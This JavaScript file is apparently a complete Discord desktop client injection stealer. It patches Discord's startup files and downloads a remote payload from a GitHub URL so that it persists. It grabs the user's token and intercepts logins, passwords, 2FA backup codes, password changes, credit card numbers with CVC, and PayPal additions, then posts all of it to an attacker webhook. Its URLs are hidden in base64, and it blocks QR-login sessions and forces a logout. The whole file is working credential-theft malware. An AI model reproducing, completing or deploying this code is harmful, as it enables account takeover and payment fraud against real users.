const fs = require('fs').promises;
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const { app, BrowserWindow, session } = require('electron');

// Helper function to check if a file exists
const exists = async (p) => {
    try {
        await fs.access(p);
        return true;
    } catch {
        return false;
    }
};

// Decode base64 strings
const decodeBase64 = (str) => Buffer.from(str, 'base64').toString('utf8');

// Obfuscated and Base64-encoded static strings
const CONFIG_BASE64 = {
    webhook: "%WEBHOOK%",
    injection_url: "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VyZW5kbC82NC9tYWluL2luamVjdGlvbl9vcmlnaW5hbF9vYmYuanM=",
    filters: {
        urls: [
            "L2F1dGgvbG9naW4=",
            "L2F1dGgvcmlnZXN0ZXI=",
            "L21mYS90b3Rw",
            "L21mYS9jb2Rlc3MtdmVyaWZpY2F0aW9u",
            "L3VzZXJzL0BtZQ==",
        ],
    },
    filters2: {
        urls: [
            "d3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheS5kaXNjb3JkLmdnLyo=",
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdnovYXV0aC9zZXNzaW9ucw==",
            "aHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hdXRoL3Nlc3Npb25z",
            "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdnovYXV0aC9zZXNzaW9ucw==",
        ],
    },
    payment_filters: {
        urls: [
            "aHR0cHM6Ly9hcGkuYnJhaW50cmVlZ2F0ZXcuanMvTWVyY2hhbnRzLzQ5cHAycnA0cGh5NzM4Ny9jbGllbnRfYXBpL3YqL3BheW1lbnRfbWV0aG9kcy9wYXlwYWwgYWNjb3VudHM=",
            "aHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnM=",
        ],
    },
    API: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l",
    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "PDw4NDg1ZGlzY29yZGVuZXBsb3llZToxMTYzMTcyMjUyOTg5MjU5ODk4Pg==",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "PDw5OTI4ZGlzY29yZHBhcnRuZXJiYWRnZToxMTYzMTcyMzA0MTU1NTg2NTcwPg==",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "PDw5MTcxSFlwc3F1YWRldmVudHM6MTE2MzE3MjI0ODE0MDY2MDgzOT4=",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "PDw0NzQ0YnVnaHVudGVyYmFkZ2VkaXNjb3JkOjExNjMxNzIyMzk5NzAxNDAzODM+",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "PDw1MDUzZXJseXN1cHBvcnRlcmRpc2NvcmQ6MTE2MzE3MjI0MTk5NjAwNTQxNj4=",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "PDwxNzU3YnVnYnVzdGVyYmFkZ2VkaXNjb3JkOjExNjMxNzIyMzg5NDI1NDM4OTI+",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "PDwxMjA3aWNvbmVhcnRseWJvdGRldmVsb3BlcmRpc2NvcmQ6MTE2MzE3MjIzNjgwNzc5MTQzPg==",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "PDw2NjAxSFlwc3F1YWRicmF2ZXJ5OjExNjMxNzIyNDY0OTIyODcwMTc+",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "PDw2OTM2SFlwc3F1YWRicmlsbGlhbmNlOjExNjMxNzIyNDQ0NzQ4MjI3NDY+",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "PDw1MjQyaHlzZXF1YWRiYWxhbmNlOjExNjMxNzIyNDM0MTc4NTgxMjg+",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "PDwxMjA3aWNvbmFjdGl2ZWRldmVsb3BlcmRpc2NvcmQ6MTE2MzE3MjUzNDQ0Mzg1MTg2OD4=",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "PDw0MTQ5Ymx1cnBsZWNtb2RlcmF0b3JkaXNjb3JkOjExNjMxNzIyNTU0ODkwODY1NDgxPg==",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "8a9a",
            Rare: false,
        },
    },
};

// Decode CONFIG_BASE64 to CONFIG
// Decode CONFIG_BASE64 to CONFIG
const CONFIG = {
    webhook: CONFIG_BASE64.webhook,
    injection_url: decodeBase64(CONFIG_BASE64.injection_url),
    filters: {
        urls: CONFIG_BASE64.filters.urls.map(decodeBase64),
    },
    filters2: {
        urls: CONFIG_BASE64.filters2.urls.map(decodeBase64),
    },
    payment_filters: {
        urls: CONFIG_BASE64.payment_filters.urls.map(decodeBase64),
    },
    API: decodeBase64(CONFIG_BASE64.API),
    badges: CONFIG_BASE64.badges,
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    if (!window) return Promise.resolve(null);
    return window.webContents.executeJavaScript(script, true);
};

const clearAllUserData = async () => {
    await executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    await executeJS("location.reload()");
};

const getToken = async () => {
    return executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
};

const request = async (method, url, headers = {}, data = null) => {
    return new Promise((resolve, reject) => {
        const options = new URL(url);
        const req = https.request({
            method: method,
            hostname: options.hostname,
            path: options.pathname + options.search,
            headers: headers
        }, (res) => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(data);
                }
            });
        }).on("error", (err) => {
            reject(err);
        });

        if (data) req.write(data);
        req.end();
    });
};

const hooker = async (content, token, account = {}) => {
    try {
        content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content["content"] || ""}`;
        content["username"] = decodeBase64("Z28tc3RlYWxlciBieSB3aDEtd2luc3NlcyAtIGNvcmQgaW5qZWN0aW9u");
        content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";

        if (!content["embeds"]) content["embeds"] = [{}];
        if (!content["embeds"][0]) content["embeds"][0] = {};
        if (!content["embeds"][0]["fields"]) content["embeds"][0]["fields"] = [];

        content["embeds"][0]["author"] = {
            "name": account.username || "Unknown",
        };
        if (account.id && account.avatar) {
            content["embeds"][0]["thumbnail"] = {
                "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
            };
        }
        content["embeds"][0]["footer"] = {
            "text": "discord injection - made by s1q1q",
            "icon_url": decodeBase64("aHR0cHM6Ly9hdmF0YXJzLmdpdGh1YnVzZXJjb250ZW50LmNvbS91LzE0NTQ4Nzg0NT92PTQ="),
        };
        content["embeds"][0]["title"] = "Account Information";

        const nitro = getNitro(account.premium_type);
        const badges = getBadges(account.flags);
        const billing = await getBilling(token);

        const friends = await getFriends(token);
        const servers = await getServers(token);

        content["embeds"][0]["fields"].push({
            "name": "Token",
            "value": `\`\`\`${token}\`\`\``,
            "inline": false
        }, {
            "name": "Nitro",
            "value": nitro,
            "inline": true
        }, {
            "name": "Badges",
            "value": badges,
            "inline": true
        }, {
            "name": "Billing",
            "value": billing,
            "inline": true
        });

        content["embeds"].push({
            "title": `Total Friends: ${friends.totalFriends}`,
            "description": friends.message,
        }, {
            "title": `Total Servers: ${servers.totalGuilds}`,
            "description": servers.message,
        });

        for (const embed of content["embeds"]) {
            embed["color"] = 0xb143e3;
        }

        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        console.error("Hooker error:", e);
    }
};

const fetch = async (endpoint, headers = {}) => {
    return request("GET", CONFIG.API + endpoint, headers);
};

const fetchAccount = async token => await fetch("", { "Authorization": token });
const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro Boost`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value) badges += `${decodeBase64(b.Emoji)} `;
    }
    return badges || '`❌`';
};

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value && b.Rare) badges += `${decodeBase64(b.Emoji)} `;
    }
    return badges;
};

const getBilling = async token => {
    try {
        const data = await fetchBilling(token);
        if (!Array.isArray(data)) return '`❌`';
        let billing = '';
        data.forEach((x) => {
            if (!x.invalid) {
                switch (x.type) {
                    case 1:
                        billing += '💳 ';
                        break;
                    case 2:
                        billing += '<:paypal:1148653305376034967> ';
                        break;
                }
            }
        });
        return billing || '`❌`';
    } catch {
        return '`❌`';
    }
};

const getFriends = async token => {
    try {
        const friends = await fetchFriends(token);
        if (!Array.isArray(friends)) return { message: "**No Rare Friends**", totalFriends: 0 };
        const filteredFriends = friends.filter(user => user.type === 1);
        let rareUsers = "";
        for (const acc of filteredFriends) {
            const badges = getRareBadges(acc.user.public_flags);
            if (badges) {
                if (!rareUsers) rareUsers = "**Rare Friends:**\n";
                rareUsers += `${badges} ${acc.user.username}\n`;
            }
        }
        rareUsers = rareUsers || "**No Rare Friends**";
        return {
            message: rareUsers,
            totalFriends: friends.length,
        };
    } catch {
        return { message: "**No Rare Friends**", totalFriends: 0 };
    }
};

const getServers = async token => {
    try {
        const guilds = await fetchServers(token);
        if (!Array.isArray(guilds)) return { message: "**No Rare Servers**", totalGuilds: 0 };
        const filteredGuilds = guilds.filter(guild => guild.permissions === '562949953421311' || guild.permissions === '2251799813685247');
        let rareGuilds = "";
        if (filteredGuilds.length > 0) {
            rareGuilds = `**Rare Servers:**\n`;
            for (const guild of filteredGuilds) {
                rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count || 0}\`\n`;
            }
        } else {
            rareGuilds = "**No Rare Servers**";
        }
        return {
            message: rareGuilds,
            totalGuilds: guilds.length,
        };
    } catch {
        return { message: "**No Rare Servers**", totalGuilds: 0 };
    }
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": `\`${email}\``,
                "inline": true
            }, {
                "name": "Password",
                "value": `\`${password}\``,
                "inline": true
            }]
        }]
    };
    await hooker(content, token, account);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);
    const filteredCodes = codes.filter(code => code.consumed === false);
    let message = "";
    for (const code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [{
                "name": "Backup Codes",
                "value": `\`\`\`${message}\`\`\``,
                "inline": false
            }, {
                "name": "Email",
                "value": `\`${account.email}\``,
                "inline": true
            }, {
                "name": "Phone",
                "value": `\`${account.phone || "None"}\``,
                "inline": true
            }]
        }]
    };
    await hooker(content, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": `\`${newPassword}\``,
                "inline": true
            }, {
                "name": "Old Password",
                "value": `\`${oldPassword}\``,
                "inline": true
            }]
        }]
    };
    await hooker(content, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": `\`${number}\``,
                "inline": true
            }, {
                "name": "CVC",
                "value": `\`${cvc}\``,
                "inline": true
            }, {
                "name": "Expiration",
                "value": `\`${month}/${year}\``,
                "inline": true
            }]
        }]
    };
    await hooker(content, token, account);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": `\`${account.email}\``,
                "inline": true
            }, {
                "name": "Phone",
                "value": `\`${account.phone || "None"}\``,
                "inline": true
            }]
        }]
    };
    await hooker(content, token, account);
};

const discordPath = (function () {
    const app = __dirname.split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    return { resourcePath, app };
})();

const logoutDiscord = async () => {
    await executeJS(`
        try {
            (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
            .find(m => m?.exports?.default?.logout !== void 0)
            ?.exports?.default?.logout();
        } catch(e) {}
        try {
            window.localStorage.clear();
            window.sessionStorage.clear();
            window.location.href = '/login';
        } catch(e) {}
    `);
};

const initiation = async () => {
    const initiationDir = path.join(__dirname, 'initiation');
    try {
        if (!await exists(initiationDir)) return;

        // Webpack ve token'ın yüklenmesi için 15 saniyeye kadar bekle
        let token = null;
        for (let i = 0; i < 15; i++) {
            try {
                token = await getToken();
                if (token && typeof token === 'string' && token.length > 20) break;
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }

        if (!token) return;

        // Başarılı olduğunda klasörü temizle
        try {
            await fs.rm(initiationDir, { recursive: true, force: true });
        } catch (e) {}

        const account = await fetchAccount(token);
        const content = {
            "content": `**${(account && account.username) ? account.username : 'Discord User'}** just got injected!`,
            "embeds": [{
                "fields": [{
                    "name": "Email",
                    "value": `\`${(account && account.email) ? account.email : 'None'}\``,
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": `\`${(account && account.phone) ? account.phone : 'None'}\``,
                    "inline": true
                }]
            }]
        };
        await hooker(content, token, account || {});
        await logoutDiscord();
    } catch (err) {
        console.error("Initiation error:", err);
    }
};

(async () => {
    const { resourcePath, app } = discordPath;
    if (!resourcePath || !app) return;

    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = (await fs.readdir(path.join(app, 'modules'))).find(x => /discord_desktop_core-+?/.test(x));
    const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
    const bdPath = path.join(process.platform === 'win32' ? process.env.APPDATA : process.env.HOME, 'betterdiscord', 'data', 'betterdiscord.asar');

    try {
        if (!await exists(appPath)) await fs.mkdir(appPath);
        if (await exists(packageJson)) await fs.unlink(packageJson);
        if (await exists(resourceIndex)) await fs.unlink(resourceIndex);

        if (process.platform === 'win32' || process.platform === 'darwin') {
            const startUpScript = `
                const fs = require('fs');
                const https = require('https');
                const indexJs = '${indexJs}';
                const bdPath = '${bdPath}';
                fs.stat(indexJs, (err, stats) => {
                    if (err || stats.size < 20000) {
                        init();
                    }
                });
                function init() {
                    https.get('${CONFIG.injection_url}', (res) => {
                        const file = fs.createWriteStream(indexJs);
                        res.pipe(file);
                        file.on('finish', () => {
                            file.close();
                        });
                    }).on("error", (err) => {
                        setTimeout(init, 10000);
                    });
                }
                require('${path.join(resourcePath, 'app.asar')}')
                if (fs.existsSync(bdPath)) require(bdPath);
            `;
            await fs.writeFile(resourceIndex, startUpScript);
        }
    } catch (err) {
        console.error("File operations error:", err);
    }
})();

let email = "";
let password = "";
let initiationCalled = false;
const attachToWindow = (win) => {
    if (!win) return;

    // Pencere yüklendiği anda tek seferlik initiation tetikle
    win.webContents.on('did-finish-load', async () => {
        if (!initiationCalled) {
            initiationCalled = true;
            await initiation();
        }
    });

    try {
        win.webContents.debugger.attach('1.3');
        win.webContents.debugger.on('message', async (_, method, params) => {
            try {
                if (method !== 'Network.responseReceived') return;
                if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
                if (![200, 202].includes(params.response.status)) return;

                const responseUnparsedData = await win.webContents.debugger.sendCommand('Network.getResponseBody', {
                    requestId: params.requestId
                });
                const responseData = JSON.parse(responseUnparsedData.body);

                let requestData = {};
                try {
                    const requestUnparsedData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', {
                        requestId: params.requestId
                    });
                    requestData = JSON.parse(requestUnparsedData.postData);
                } catch (e) {}

                switch (true) {
                    case params.response.url.endsWith('/login'):
                        if (!responseData.token) {
                            email = requestData.login || "";
                            password = requestData.password || "";
                            return; // 2FA
                        }
                        await EmailPassToken(requestData.login || email, requestData.password || password, responseData.token, "logged in");
                        break;

                    case params.response.url.endsWith('/register'):
                        await EmailPassToken(requestData.email || "", requestData.password || "", responseData.token, "signed up");
                        break;

                    case params.response.url.endsWith('/totp'):
                        await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                        break;

                    case params.response.url.endsWith('/codes-verification'):
                        await BackupCodesViewed(responseData.backup_codes, await getToken());
                        break;

                    case params.response.url.endsWith('/@me'):
                        if (!requestData.password) return;

                        if (requestData.email) {
                            await EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                        }

                        if (requestData.new_password) {
                            await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                        }
                        break;
                }
            } catch (cdpErr) {
                console.error("CDP event error:", cdpErr);
            }
        });
        win.webContents.debugger.sendCommand('Network.enable');
    } catch (e) {}
};

// Hem mevcut hem de yeni açılacak pencereleri yakala:
if (app) {
    app.on('browser-window-created', (_, win) => {
        attachToWindow(win);
    });
}

const wins = BrowserWindow.getAllWindows();
if (wins.length > 0) {
    attachToWindow(wins[0]);
}

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method !== 'POST') return;

    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({ cancel: true });
});

module.exports = require("./core.asar");
